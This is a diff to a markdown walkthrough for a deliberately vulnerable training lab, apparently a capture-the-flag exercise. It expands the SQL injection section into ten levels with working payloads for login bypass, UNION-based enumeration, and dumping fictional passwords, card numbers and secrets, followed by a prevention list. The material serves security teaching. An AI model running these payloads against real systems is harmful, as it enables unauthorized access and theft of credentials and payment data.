@@ -7,17 +7,28 @@ This document contains detailed exploitation walkthroughs for all 10 beginner la
 ## Lab 1: SQL Injection - SecureBank Online
 
 **URL:** `/labs/beginner/sqli`
-**API Endpoint:** `POST /api/labs/sqli/login`
-**Scenario:** A banking portal login form vulnerable to SQL injection
+**API Endpoints:**
+- `POST /api/labs/sqli/login` - Login form (auth bypass)
+- `GET /api/labs/sqli/search?q=` - Account search (UNION-based injection)
+- `GET /api/labs/sqli/account/:id` - Account lookup (parameter injection)
 
-### Exploitation Steps
+**Scenario:** A complete banking portal with login, search, and account lookup functionality - all vulnerable to different SQL injection techniques.
 
-1. Navigate to the SQL Injection lab
+### Attack Surface Overview
+
+| Feature | Endpoint | Attack Type |
+|---------|----------|-------------|
+| Login | `/api/labs/sqli/login` | Auth Bypass (OR-based) |
+| Search | `/api/labs/sqli/search?q=` | UNION-based, Table/Column enumeration |
+| Account | `/api/labs/sqli/account/:id` | Boolean-blind, UNION injection |
+
+---
+
+### Level 1: Basic Authentication Bypass
+
+1. Navigate to the SQL Injection lab Login tab
 2. Open Burp Suite and configure your browser to use the proxy
-3. Attempt to login with any credentials to capture the request
-4. Send the request to Repeater
-
-### Basic SQL Injection Bypass
+3. Intercept the login request
 
 **Payload in username field:**
 ```
@@ -32,23 +43,210 @@ admin'--
 1' OR '1'='1
 ```
 
-### Admin Access Bypass
-
-**Payload:**
+**Admin Access Bypass:**
 ```
 admin'--
 ```
 
-This bypasses authentication and logs in as the admin user.
-
-### Flags
+**Flags:**
 - `FLAG{SQL_INJECTION_AUTH_BYPASS}` - Basic authentication bypass
 - `FLAG{SQL_INJECTION_ADMIN_BYPASS}` - Admin-level access with debug info
 
+---
+
+### Level 2: Column Count Enumeration (ORDER BY)
+
+Switch to the **Account Search** tab and use ORDER BY to discover column count.
+
+**Step 1: Test column count with ORDER BY**
+```
+GET /api/labs/sqli/search?q=test&order=1    # Works
+GET /api/labs/sqli/search?q=test&order=2    # Works
+GET /api/labs/sqli/search?q=test&order=3    # Works
+GET /api/labs/sqli/search?q=test&order=4    # Error!
+```
+
+When ORDER BY 4 fails, you know there are exactly 3 columns.
+
+**Flag:** `FLAG{SQLI_COLUMN_COUNT_3}` - Discovered via ORDER BY error
+
+---
+
+### Level 3: UNION-Based Column Matching
+
+**Step 2: Confirm column count with UNION SELECT NULL**
+```
+' UNION SELECT NULL--                    # Error (1 column)
+' UNION SELECT NULL,NULL--               # Error (2 columns)
+' UNION SELECT NULL,NULL,NULL--          # Success! (3 columns)
+```
+
+**Flag:** `FLAG{SQLI_UNION_COLUMN_MATCH}` - Matched column count
+
+---
+
+### Level 4: Database Fingerprinting
+
+**Step 3: Extract database version and name**
+```
+' UNION SELECT 1,@@version,database()--
+```
+
+**Flag:** `FLAG{SQLI_DATABASE_VERSION_LEAK}` - MySQL 8.0.32, SecureBank_Production
+
+---
+
+### Level 5: Table Enumeration (information_schema)
+
+**Step 4: Discover all tables in the database**
+```
+' UNION SELECT 1,table_name,table_type FROM information_schema.tables--
+```
+
+**Discovered Tables:**
+- `users` - User accounts and credentials
+- `credit_cards` - Credit card information
+- `transactions` - Transaction history
+- `admin_secrets` - Administrative secrets
+
+**Flag:** `FLAG{SQLI_TABLE_ENUMERATION}` - Table discovery
+
+---
+
+### Level 6: Column Enumeration
+
+**Step 5: Discover columns in the users table**
+```
+' UNION SELECT 1,column_name,data_type FROM information_schema.columns WHERE table_name='users'--
+```
+
+**Discovered Columns (users table):**
+- id (int)
+- username (varchar)
+- password (varchar)
+- email (varchar)
+- role (varchar)
+- balance (decimal)
+- ssn (varchar)
+
+**Flag:** `FLAG{SQLI_COLUMN_ENUMERATION}` - Column discovery
+
+---
+
+### Level 7: Data Extraction - Password Dump
+
+**Step 6: Extract usernames and passwords**
+```
+' UNION SELECT 1,username,password FROM users--
+```
+
+**Extracted Data:**
+| Username | Password |
+|----------|----------|
+| admin | SuperSecure@2024! |
+| john_doe | john123 |
+| jane_smith | janePass! |
+| bob_wilson | bobwil2024 |
+
+**Flag:** `FLAG{SQLI_PASSWORD_DUMP}` - Password extraction
+
+---
+
+### Level 8: Credit Card Data Extraction
+
+**Step 7: Extract credit card information**
+```
+' UNION SELECT 1,card_number,cvv FROM credit_cards--
+```
+
+**Extracted Data:**
+| Card Number | CVV | Expiry |
+|-------------|-----|--------|
+| 4532-1234-5678-9012 | 123 | 12/26 |
+| 4532-2345-6789-0123 | 456 | 03/25 |
+| 4532-3456-7890-1234 | 789 | 08/27 |
+
+**Flag:** `FLAG{SQLI_CREDIT_CARD_DUMP}` - Credit card data
+
+---
+
+### Level 9: Admin Secrets Extraction
+
+**Step 8: Extract admin secrets table**
+```
+' UNION SELECT 1,key,value FROM admin_secrets--
+```
+
+**Extracted Secrets:**
+- master_password: FLAG{SQLI_TABLE_DUMP_SUCCESS}
+- api_key: sk_live_SecureBankAPIKey2024
+- encryption_key: AES256-SecureBank-MasterKey
+
+**Flag:** `FLAG{SQLI_ADMIN_SECRETS_DUMP}` - Administrative secrets
+
+---
+
+### Level 10: Account Lookup Injection
+
+Switch to the **Account Lookup** tab for ID-based injection.
+
+**Boolean-Based Blind SQLi:**
+```
+GET /api/labs/sqli/account/1 AND 1=1    # Returns data (true)
+GET /api/labs/sqli/account/1 AND 1=2    # No data (false)
+```
+
+**Flags:**
+- `FLAG{SQLI_BOOLEAN_BLIND_TRUE}` - True condition
+- `FLAG{SQLI_BOOLEAN_BLIND_FALSE}` - False condition
+
+**OR-Based Dump:**
+```
+GET /api/labs/sqli/account/1 OR 1=1
+```
+
+**Flag:** `FLAG{SQLI_OR_BASED_DUMP}` - Dumps all accounts
+
+**UNION in ID Parameter:**
+```
+GET /api/labs/sqli/account/1 UNION SELECT 1,key,value FROM admin_secrets
+```
+
+**Flags:**
+- `FLAG{SQLI_ID_PARAMETER_INJECTION}` - Basic UNION in ID
+- `FLAG{SQLI_ID_UNION_INJECTION}` - UNION to admin_secrets
+
+---
+
+### All SQL Injection Flags Summary
+
+| Attack Type | Flag |
+|-------------|------|
+| Auth Bypass (basic) | `FLAG{SQL_INJECTION_AUTH_BYPASS}` |
+| Auth Bypass (admin) | `FLAG{SQL_INJECTION_ADMIN_BYPASS}` |
+| Column Count (ORDER BY) | `FLAG{SQLI_COLUMN_COUNT_3}` |
+| UNION Column Match | `FLAG{SQLI_UNION_COLUMN_MATCH}` |
+| Database Version | `FLAG{SQLI_DATABASE_VERSION_LEAK}` |
+| Table Enumeration | `FLAG{SQLI_TABLE_ENUMERATION}` |
+| Column Enumeration | `FLAG{SQLI_COLUMN_ENUMERATION}` |
+| Password Dump | `FLAG{SQLI_PASSWORD_DUMP}` |
+| Credit Card Dump | `FLAG{SQLI_CREDIT_CARD_DUMP}` |
+| Admin Secrets | `FLAG{SQLI_ADMIN_SECRETS_DUMP}` |
+| Search Bypass | `FLAG{SQLI_SEARCH_BYPASS}` |
+| Boolean Blind (true) | `FLAG{SQLI_BOOLEAN_BLIND_TRUE}` |
+| Boolean Blind (false) | `FLAG{SQLI_BOOLEAN_BLIND_FALSE}` |
+| OR-Based Dump | `FLAG{SQLI_OR_BASED_DUMP}` |
+| ID UNION Injection | `FLAG{SQLI_ID_UNION_INJECTION}` |
+| Table Dump Success | `FLAG{SQLI_TABLE_DUMP_SUCCESS}` |
+
+**Total: 16 flags for SQL Injection lab**
+
 ### Prevention
 - Use parameterized queries/prepared statements
-- Implement input validation
+- Implement input validation and sanitization
 - Apply least privilege database accounts
+- Use Web Application Firewalls (WAF)
+- Implement proper error handling (no verbose errors)
 
 ---
 
@@ -476,7 +674,7 @@ for order_id in range(1001, 1010):
 
 | Lab | Vulnerability | Flag(s) |
 |-----|--------------|---------|
-| 1 | SQL Injection | `FLAG{SQL_INJECTION_AUTH_BYPASS}`, `FLAG{SQL_INJECTION_ADMIN_BYPASS}` |
+| 1 | SQL Injection | 16 flags: Auth bypass, UNION attacks, table/column enumeration, password dump, credit card dump, admin secrets, boolean blind, OR-based dump |
 | 2 | XSS | `FLAG{STORED_XSS_INJECTION}`, `FLAG{REFLECTED_XSS_SEARCH}` |
 | 3 | JWT Auth Bypass | `FLAG{JWT_ALGORITHM_NONE_BYPASS}`, `FLAG{JWT_ROLE_TAMPERING_SUCCESS}` |
 | 4 | Command Injection | `FLAG{COMMAND_INJECTION_RCE}` |
@@ -487,4 +685,4 @@ for order_id in range(1001, 1010):
 | 9 | API Leakage | `FLAG{API_DEBUG_MODE_EXPOSURE}` |
 | 10 | IDOR | `FLAG{IDOR_ORDER_ACCESS}` |
 
-Total: 25+ flags across 10 labs
+Total: 40+ flags across 10 labs
